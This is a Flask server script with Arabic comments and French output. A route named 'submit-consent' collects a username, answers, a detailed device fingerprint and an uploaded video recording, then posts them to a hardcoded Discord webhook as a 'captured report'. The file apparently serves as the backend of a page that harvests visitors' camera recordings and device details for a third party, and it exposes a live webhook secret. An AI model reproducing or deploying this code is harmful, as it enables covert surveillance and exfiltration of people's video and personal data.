import os
import json
import requests
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

DISCORD_WEBHOOK_URL = os.getenv(
    "DISCORD_WEBHOOK_URL",
    "https://discord.com/api/webhooks/1558192127085781025/wUzlyTNtQbjoWz6aTgsE_YAKXj14XYo-gs7C6f25QBfqr_LqWUZQBQ97bUKdZsJ69X-E"
)

@app.route("/")
def home():
    return render_template("index.html")

@app.route("/submit-consent", methods=["POST"])
def submit_consent():
    username = request.form.get("username", "Utilisateur Anonyme")
    location = request.form.get("location", "Non disponible")
    
    # قراءة بيانات الجهاز وتفكيك الـ JSON بأمان
    device_str = request.form.get("device", "{}")
    try:
        device = json.loads(device_str)
    except Exception:
        device = {}

    q1 = request.form.get("q1", "N/A")
    q2 = request.form.get("q2", "N/A")
    q3 = request.form.get("q3", "N/A")
    video_file = request.files.get("video")

    # استخراج كل المعطيات باللغة الفرنسية وبدقة
    appareil = device.get('appareil', 'Appareil Inconnu')
    systeme = device.get('systemeExploitation', 'Système Inconnu')
    navigateur = device.get('navigateur', 'Inconnu')
    langue = device.get('langueSysteme', 'Inconnue')
    ram = device.get('memoireRAMApproximative', 'Non disponible')
    cpu = device.get('processeurCœurs', 'Non disponible')
    resolution = device.get('resolutionEcran', 'Non disponible')
    batterie = device.get('niveauBatterie', 'Non disponible')
    charge = device.get('etatCharge', 'Non disponible')
    eco = device.get('modeEconomieEnergie', 'Non disponible')
    orientation = device.get('orientationEcran', 'Non disponible')
    tactile = device.get('pointsTactilesMax', 'Non disponible')
    architecture = device.get('architectureCPU', 'Non disponible')
    reseau = device.get('connexionReseau', 'Non disponible')
    time_zone = device.get('fuseauHoraire', 'Non disponible')

    # صياغة التقرير كاملاً باللغة الفرنسية للـ Discord
    content_text = f"""✅ **Nouveau Rapport Capturé (Capture/Formulaire):**
• **Nom / Statut:** {username}
• **Questions:** Q1: {q1} | Q2: {q2} | Q3: {q3}
• **Appareil:** {appareil}
• **Système d'exploitation:** {systeme}
• **Navigateur:** {navigateur}
• **Langue du système:** {langue}
• **Niveau de Batterie:** {batterie} ({charge})
• **Économie d'énergie:** {eco}
• **Mémoire RAM:** {ram}
• **Processeur (CPU):** {cpu} ({architecture})
• **Résolution Écran:** {resolution} ({orientation})
• **Points Tactiles:** {tactile}
• **Réseau:** {reseau}
• **Fuseau Horaire:** {time_zone}"""

    payload = {
        "content": content_text
    }

    try:
        files = {}
        if video_file:
            # تحديد نوع الملف والامتداد تلقائياً
            filename = video_file.filename or "recording.webm"
            content_type = "video/mp4" if filename.endswith(".mp4") else "video/webm"
            files = {
                "file": (filename, video_file.read(), content_type)
            }

        resp = requests.post(
            DISCORD_WEBHOOK_URL, 
            data={"payload_json": json.dumps(payload)}, 
            files=files, 
            timeout=15
        )
        resp.raise_for_status()
        return jsonify({"message": "Success"}), 200
    except requests.RequestException as e:
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    app.run(port=5000, debug=True)
